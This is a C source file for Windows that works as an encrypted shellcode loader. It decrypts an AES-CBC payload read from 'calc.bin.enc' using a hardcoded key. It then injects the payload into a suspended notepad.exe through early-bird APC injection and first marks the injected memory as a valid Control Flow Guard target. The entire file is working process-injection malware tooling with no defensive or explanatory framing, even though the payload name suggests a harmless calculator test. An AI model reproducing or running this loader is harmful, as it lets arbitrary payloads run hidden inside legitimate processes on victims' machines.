#include <stdio.h>
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

#define PAYLOAD_KEY_SIZE 32
#define PAYLOAD_IV_SIZE 16

typedef BOOL(WINAPI* fnSetProcessValidCallTargets)(
    _In_ HANDLE hProcess,
    _In_ PVOID VirtualAddress,
    _In_ SIZE_T RegionSize,
    _In_ ULONG NumberOfOffsets,
    _In_ PCFG_CALL_TARGET_INFO OffsetInformation);

int main()
{
    LARGE_INTEGER fileSize = { 0 };
    DWORD decryptedPayloadSize = 0;
    PBYTE pPlaintext = NULL;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    HANDLE hProc = NULL;
    HANDLE hMainThread = NULL;
    NTSTATUS status = 0;
    PROCESS_INFORMATION pi = { 0 };

    unsigned char* encryptedPayload = NULL;
    LPVOID pRemote = NULL;

    // get key file handle
    HANDLE hFile = CreateFileA("calc.bin.enc", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("(!) failed to open key file.\n");
        goto cleanup;
    }

    // get file size
    if (!GetFileSizeEx(hFile, (PLARGE_INTEGER)&fileSize)) {
        printf("(!) failed to get file size.\n");
        goto cleanup;
    }

    // allocate memory for encrypted payload
    encryptedPayload = (unsigned char*)malloc(fileSize.QuadPart);
    if (encryptedPayload == NULL) {
        printf("(!) failed to allocate memory for encrypted payload.\n");
        goto cleanup;
    }

    // read encrypted payload into memory buffer
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, encryptedPayload, (DWORD)fileSize.QuadPart, &bytesRead, NULL)) {
        printf("(!) failed to read encrypted payload.\n");
        goto cleanup;
    }
    else printf("(+) successfully read encrypted payload into memory buffer.\n");

    // initialize AES CBC
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) {
        printf("(!) failed to open algorithm provider.\n");
        goto cleanup;
    }

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (status != 0) {
        printf("(!) failed to set chaining mode.\n");
        goto cleanup;
    }

    BYTE key[PAYLOAD_KEY_SIZE] = { 0x9f,0x2e,0x7c,0x4b,0xa1,0xd5,0x68,0x3f,0xe6,0x12,0x9c,0x75,0x4d,0xb8,0x03,0xe1,
                                   0x2a,0x6f,0x9d,0x14,0x8b,0xc7,0x5e,0x30,0xf4,0x81,0x26,0x5a,0xd9,0x7b,0xc0,0x18 };

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, PAYLOAD_KEY_SIZE, 0);
    if (status != 0) {
        printf("(!) failed to generate symmetric key.\n");
        goto cleanup;
    }

    BYTE iv[PAYLOAD_IV_SIZE];
    memcpy(iv, encryptedPayload, PAYLOAD_IV_SIZE);

    // query required buffer size for decrypted payload
    status = BCryptDecrypt(hKey, encryptedPayload + PAYLOAD_IV_SIZE, (DWORD)(fileSize.QuadPart - PAYLOAD_IV_SIZE), NULL, iv, PAYLOAD_IV_SIZE, NULL, 0, &decryptedPayloadSize, 0);
    if (status != 0) {
        printf("(!) failed to query decrypted payload size.\n");
        goto cleanup;
    }

    pPlaintext = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, decryptedPayloadSize);
    if (!pPlaintext) {
        printf("(!) failed to allocate memory for decrypted payload.\n");
        goto cleanup;
    }

    // re-copy IV since BCryptDecrypt updates the IV buffer in CBC mode
    memcpy(iv, encryptedPayload, PAYLOAD_IV_SIZE);

    // decrypt the payload
    status = BCryptDecrypt(hKey, encryptedPayload + PAYLOAD_IV_SIZE, (DWORD)(fileSize.QuadPart - PAYLOAD_IV_SIZE), NULL, iv, PAYLOAD_IV_SIZE, pPlaintext, decryptedPayloadSize, &decryptedPayloadSize, 0);
    if (status != 0) {
        printf("(!) failed to decrypt payload.\n");
        goto cleanup;
    }

    printf("(+) decrypted %lu bytes of payload.\n", decryptedPayloadSize);

    if (decryptedPayloadSize == 0) {
        printf("(!) decrypted payload size is zero.\n");
        goto cleanup;
    }

    // start suspended notepad process
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("(!) failed to create suspended notepad process.\n");
        goto cleanup;
    }

    hProc = pi.hProcess;
    hMainThread = pi.hThread;
    printf("(+) successfully created suspended notepad process.\n");

    // early bird APC injection
    pRemote = VirtualAllocEx(hProc, NULL, decryptedPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        printf("(!) failed to allocate memory in remote process.\n");
        goto cleanup;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProc, pRemote, pPlaintext, decryptedPayloadSize, &bytesWritten)) {
        printf("(!) failed to write payload to remote process.\n");
        goto cleanup;
    }

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProc, pRemote, decryptedPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("(!) failed to change memory protection.\n");
        goto cleanup;
    }

    // SetProcessValidCallTargets for CFG
    fnSetProcessValidCallTargets pSetProcessValidCallTargets = (fnSetProcessValidCallTargets)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessValidCallTargets");
    if (pSetProcessValidCallTargets) {
        CFG_CALL_TARGET_INFO cfgInfo = { 0, CFG_CALL_TARGET_VALID };
        if (!pSetProcessValidCallTargets(hProc, pRemote, decryptedPayloadSize, 1, &cfgInfo))
            printf("(!) SetProcessValidCallTargets failed. Error=%lu (continuing)\n", GetLastError());
    }

    if (!QueueUserAPC((PAPCFUNC)pRemote, hMainThread, (ULONG_PTR)NULL)) {
        printf("(!) failed to queue APC.\n");
        goto cleanup;
    }
    printf("(+) successfully queued APC to main thread.\n");

    // resume main thread to trigger APC execution
    if (ResumeThread(hMainThread) == (DWORD)-1) {
        printf("(!) failed to resume main thread.\n");
        goto cleanup;
    }
    printf("(+) successfully resumed main thread to trigger APC execution.\n");

    printf("(+) Waiting a moment for payload to execute...\n");
    Sleep(2000);   // give time for APC to execute before cleaning up and exiting
    // without this sleep the process may be terminated before the APC has a chance to execute, especially if the payload is small and executes quickly

cleanup:
    if (encryptedPayload) free(encryptedPayload);
    if (hFile) CloseHandle(hFile);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pPlaintext) HeapFree(GetProcessHeap(), 0, pPlaintext);
    if (pRemote && hProc) VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);

    if (hProc) {
        if (GetLastError() != 0)
            TerminateProcess(hProc, 0);
        CloseHandle(hProc);
    }
    if (hMainThread) CloseHandle(hMainThread);

    return 0;
}